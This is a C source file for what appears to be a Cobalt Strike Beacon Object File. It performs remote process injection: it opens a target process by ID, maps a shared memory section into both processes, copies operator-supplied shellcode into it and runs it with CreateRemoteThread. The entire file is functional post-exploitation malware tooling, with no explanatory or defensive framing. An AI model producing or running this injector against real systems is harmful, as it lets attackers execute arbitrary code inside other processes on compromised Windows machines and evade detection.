#include <stdio.h>
#include <windows.h>
#include "beacon.h"
#include "libc.h"

#define NT_SUCCESS 0x00000000

WINBASEAPI   HANDLE   WINAPI KERNEL32$OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
NTSYSCALLAPI NTSTATUS WINAPI NTDLL$NtCreateSection(PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, PLARGE_INTEGER MaximumSize, ULONG SectionPageProtection, ULONG AllocationAttributes, HANDLE FileHandle);
NTSYSAPI     NTSTATUS WINAPI NTDLL$NtMapViewOfSection(HANDLE, HANDLE, PVOID, ULONG, SIZE_T, PLARGE_INTEGER, PSIZE_T, UINT, ULONG, ULONG);
NTSYSAPI     NTSTATUS WINAPI NTDLL$NtUnmapViewOfSection(HANDLE, PVOID);
NTSYSCALLAPI NTSTATUS WINAPI NTDLL$NtClose(HANDLE);
WINBASEAPI   HANDLE   WINAPI KERNEL32$CreateRemoteThread(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
WINBASEAPI   HANDLE   WINAPI KERNEL32$GetCurrentProcess(void);
WINBASEAPI   ULONG    NTAPI  NTDLL$RtlNtStatusToDosError( NTSTATUS Status );
WINBASEAPI   DWORD    WINAPI KERNEL32$GetLastError(VOID);

void go(char * args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);

    DWORD procID = BeaconDataInt(&parser);
    SIZE_T shellcodeSize = NULL;
    CHAR* shellcode = BeaconDataExtract(&parser, &shellcodeSize);

    BeaconPrintf(CALLBACK_OUTPUT, "Size: %d", shellcodeSize);

    HANDLE hSection = NULL;
    HANDLE baseAddrRemote = NULL;
    HANDLE baseAddrLocal = NULL;

    LARGE_INTEGER sectionSize = { shellcodeSize };

    HANDLE hLocalProcess  = KERNEL32$GetCurrentProcess();
    HANDLE hRemoteProcess = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, FALSE, procID);

    // Create RWX memory section
    NTSTATUS NtStatus = NTDLL$NtCreateSection(&hSection, GENERIC_ALL, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    if(NtStatus != NT_SUCCESS) {
        ULONG error = NTDLL$RtlNtStatusToDosError(NtStatus);
        BeaconPrintf(CALLBACK_ERROR, "Error creating RWX memory section. Error: %d\n", error);
        return;
    }

    // Map RW Section of Local Process
    NtStatus = NTDLL$NtMapViewOfSection(hSection, hLocalProcess, &baseAddrLocal, NULL, 0,  NULL, &shellcodeSize, 2, 0, PAGE_READWRITE);
    if(NtStatus != NT_SUCCESS) {
        ULONG error = NTDLL$RtlNtStatusToDosError(NtStatus);
        BeaconPrintf(CALLBACK_ERROR, "Error mapping local process. Error: %d\n", error);
        return;
    }

    // Map view of same section for remote process
    NtStatus = NTDLL$NtMapViewOfSection(hSection, hRemoteProcess, &baseAddrRemote, NULL, 0, NULL, &shellcodeSize, 2, 0, PAGE_EXECUTE_READ);
    if(NtStatus != NT_SUCCESS) {
        ULONG error = NTDLL$RtlNtStatusToDosError(NtStatus);
        BeaconPrintf(CALLBACK_ERROR, "Error mapping remote process. Error: %d\n", error);
        return;
    }

    // Copy buffer to mapped local process
    mycopy(baseAddrLocal, shellcode, shellcodeSize);

    // Unmap local view
    NtStatus = NTDLL$NtUnmapViewOfSection(hLocalProcess, baseAddrLocal);
    if(NtStatus != NT_SUCCESS) {
        ULONG error = NTDLL$RtlNtStatusToDosError(NtStatus);
        BeaconPrintf(CALLBACK_OUTPUT, "Error unmapping view. Error: %d\n", error);
    }

    // Close section
    NtStatus = NTDLL$NtClose(hSection);
    if(NtStatus != NT_SUCCESS) {
        ULONG error = NTDLL$RtlNtStatusToDosError(NtStatus);
        BeaconPrintf(CALLBACK_OUTPUT, "Error closing handle. Error: %d\n", error);
    }

    // Create thread
    HANDLE hThread = KERNEL32$CreateRemoteThread(hRemoteProcess, NULL, 0, (LPTHREAD_START_ROUTINE) baseAddrRemote, NULL, 0, NULL);
    if(hThread == NULL)
        BeaconPrintf(CALLBACK_ERROR, "Error creating remote thread. Error: %d\n", KERNEL32$GetLastError());
    else
        BeaconPrintf(CALLBACK_OUTPUT, "New remote thread created");
}
